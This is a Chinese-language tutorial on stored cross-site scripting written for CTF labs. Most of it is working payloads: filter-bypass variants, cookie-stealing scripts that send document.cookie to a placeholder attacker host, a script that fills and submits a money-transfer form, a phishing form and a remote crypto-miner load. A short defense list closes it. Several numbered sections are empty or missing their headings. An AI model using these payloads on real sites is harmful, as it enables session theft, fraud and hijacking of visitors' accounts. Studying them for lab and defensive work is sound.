储存型xss及恶意<script>代码

2026-03-19

一、存储型 XSS 介绍

1. 什么是存储型 XSS

Stored XSS（存储型跨站脚本） 攻击者提交的 恶意 JS 代码被服务器存到数据库，之后所有访问这个页面的用户，浏览器都会自动执行这段恶意 JS。

2. 和反射型 XSS 最大区别

  • 反射型 XSS：代码在 URL 里，不点链接不触发，一次性。
  • 存储型 XSS：代码进数据库，只要打开页面就执行，永久危害、危害最大。

3. 常见出现位置

  • 留言板、评论区
  • 个人资料、昵称、签名
  • 帖子内容、公告
  • 任何提交后会显示给别人看的地方

4. 危害

  • 直接偷所有访客的 Cookie
  • 自动劫持管理员账号
  • 挂木马、跳转钓鱼、篡改页面
  • 是 CTF、渗透测试里最容易拿高分、拿权限的漏洞之一

二、存储型 XSS 标准靶场解题步骤

步骤1：找“提交→展示”的点

找这类功能：

  • 留言、发表评论
  • 修改昵称、个人简介
  • 发布文章

只要：你提交内容 → 别的页面能看到你写的内容，就可能存在存储型XSS。

步骤2：插入最简单的测试 payload

提交：

1

<script>alert(1)</script>

然后刷新/进入展示页面：

  • 弹出 1 → 存在存储型XSS
  • 没弹窗 → 有过滤，需要绕过

步骤3：常见绕过方式（背下来就能打绝大多数靶场）

1. 过滤 <script>

用其他标签：

1
2
3

<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>

2. 过滤 alert

换成：

1
2

confirm(1)
prompt(1)

3. 过滤空格

用 / 代替空格：

1

<img/src=x/onerror=alert(1)>

4. 大小写绕过 

1

<SCRIPT>alert(1)</SCRIPT>

5. 关键词被替换为空

双写绕过：

1

<scrscriptipt>alert(1)</scrscriptipt>

步骤4：拿到 Cookie（CTF 常规目的）

把弹窗代码换成 偷Cookie并发送到自己服务器：

1

<img src=x onerror="window.location='http://你的接收地址?c='+document.cookie">

管理员后台一打开，你就拿到他的 Cookie，直接登录后台。

步骤5：查看网页源代码判断过滤

F12 看你的代码被输出在哪里：

  • 被转成 &lt;script&gt; → 输出在HTML里被转义，很难利用
  • 原封不动输出 → 百分百存在存储型XSS

三、实战流程

  1. 找到留言框 / 个人资料
  2. 提交：<script>alert(1)</script>
  3. 查看是否弹窗
  4. 不弹窗就换：<img src=x onerror=alert(1)>
  5. 弹窗成功后，换成偷Cookie的payload
  6. 拿到管理员Cookie → 登录后台 → 拿到flag

四、防御方法

  1. 输出HTML转义（把 < > " ’ & 编码）
  2. Cookie 设置 HttpOnly（JS 拿不到Cookie）
  3. 使用 CSP 内容安全策略
  4. 前端框架（Vue/React）默认防止XSS

补充：恶意的<script>代码介绍

简单来说：恶意的 <script> 代码就是攻击者注入到网页中，能未经用户允许执行有害操作的 JavaScript 代码。它本身是合法的 JS 语法，但被用于窃取信息、劫持账号、篡改页面等恶意目的——核心不是代码语法“非法”，而是执行的行为违背用户/网站意愿。

一、恶意 <script> 代码的核心特征

  1. 非授权执行：浏览器执行了用户/网站开发者没允许的操作；
  2. 利用网页权限：依托当前页面的登录状态、Cookie、DOM 权限做事；
  3. 隐蔽性：通常不会直接弹窗（实战中 alert(1) 只是测试，真正的恶意代码会悄悄执行）。

二、最常见的恶意 <script> 代码示例（实战中最常遇到）

1. 偷取用户 Cookie（XSS 最核心目的）

Cookie 里包含用户登录凭证，偷到就能冒充用户登录：

1

<script>
  // 把 Cookie 发送到攻击者的服务器
  var cookie = document.cookie;
  // 攻击者的接收地址（比如自己搭的简易服务器）
  var url = "http://攻击者的域名/steal?cookie=" + encodeURIComponent(cookie);
  // 用图片请求悄悄发送，用户毫无感知
  new Image().src = url;
</script>

2. 劫持用户操作（冒充用户发消息/转账）

利用当前登录状态，模拟用户点击、提交表单：

1

<script>
  // 自动给攻击者的账号转账（假设页面有转账表单）
  document.getElementById("to_account").value = "攻击者账号";
  document.getElementById("money").value = "10000";
  document.getElementById("submit_btn").click(); // 自动提交转账
</script>

    <form action="http://攻击者的钓鱼服务器" method="post">

      密码：<input type="password" name="password"><br>
      <input type="submit" value="登录">
    </form>

4. 监听用户行为（偷密码/操作记录）

5. 植入木马/挖矿脚本（消耗用户资源）

让用户浏览器偷偷挖矿、下载恶意程序：

<script src="http://攻击者域名/miner.js"></script> // 加载挖矿脚本

三、恶意代码的“伪装”手段（实战中攻击者常用）

为了绕过网站过滤，攻击者会把恶意代码伪装成无害形式，比如：

  1. 编码混淆：

<svg onload="偷Cookie的代码">
  3. 拆分拼接： 把关键词拆分开，绕过“关键词过滤”：

    <script>
  var a = "aler";
  var b = "t";
  var c = "(1)";
  eval(a+b+c); // 拼接成 alert(1) 执行
</script>

四、和“正常 JS 代码”的区别

维度 正常 JS 代码 恶意 <script> 代码
执行目的 实现网站功能（登录、展示） 窃取信息、劫持账号、损害用户
授权状态 网站开发者/用户明确允许 未经授权，偷偷执行
可见性 行为透明（如点击按钮才执行） 隐蔽执行（用户无感知）
